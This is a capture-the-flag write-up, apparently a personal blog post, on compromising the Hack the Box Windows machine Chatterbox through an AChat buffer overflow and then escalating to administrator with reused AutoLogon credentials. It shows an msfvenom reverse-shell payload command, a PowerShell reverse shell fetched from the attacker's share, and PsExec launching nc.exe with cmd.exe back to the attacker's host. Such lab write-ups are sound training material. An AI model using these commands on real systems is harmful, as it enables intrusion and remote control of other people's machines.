---
layout: post
title: Hack the Box - Chatterbox
date: 2020-09-18 00:56:22 +0100
description: Chatterbox is a fairly straightforward machine that requires basic exploit modification or Metasploit troubleshooting skills to complete.
img: chatterbox.png
fig-caption: Chatterbox
categories: HackTheBox
tags: [Medium, Windows, Retired, CVE]
---
## Overview
Chatterbox is a fairly straightforward machine that requires basic exploit modification or Metasploit troubleshooting skills to complete.

## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/chatterbox]
└─$ sudo nmap -p- -T4 10.129.118.66                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-23 12:19 GMT
Stats: 0:01:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 13.20% done; ETC: 12:29 (0:08:39 remaining)
Nmap scan report for 10.129.118.66
Host is up (0.016s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
9255/tcp open  mon
9256/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 157.42 seconds
                                                                                                                                                                                                                                             
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/chatterbox]
└─$ sudo nmap -p9255,9256 -sV 10.129.118.66
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-23 12:22 GMT
Nmap scan report for 10.129.118.66
Host is up (0.017s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
9256/tcp open  achat   AChat chat system

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/chatterbox]
└─$ searchsploit achat
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                         | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                            | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities               | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                 | php/webapps/24647.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
## Foothold
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/chatterbox]
└─$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=10.10.14.27 LPORT=8889 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/chatterbox]
└─$ python exploit.py

┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/chatterbox]
└─$ nc -nlvp 8888                                                            
listening on [any] 8888 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.118.66] 49160
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```
## Privilege Escalation
```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1
```
```
C:\Users\Alfred> net use \\CHATTERBOX /user:CHATTERBOX\Administrator Welcome1!
C:\Users\Alfred> copy \\10.10.14.27\kali\power-reverse.ps1 .
C:\Users\Alfred> powershell -exec bypass ". .\power-reverse.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 4488"
```
```
PS C:\Users\Alfred> copy \\10.10.14.27\kali\PsExec.exe psexec.exe
PS C:\Users\Alfred> .\psexec.exe -accepteula -u CHATTERBOX\Administrator -p Welcome1! -i C:\Users\Alfred\nc.exe -nv 10.10.14.27 4891 -e cmd.exe

┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/chatterbox]
└─$ nc -nlvp 4891                                                            
listening on [any] 4891 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.25.108] 49170
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\administrator
```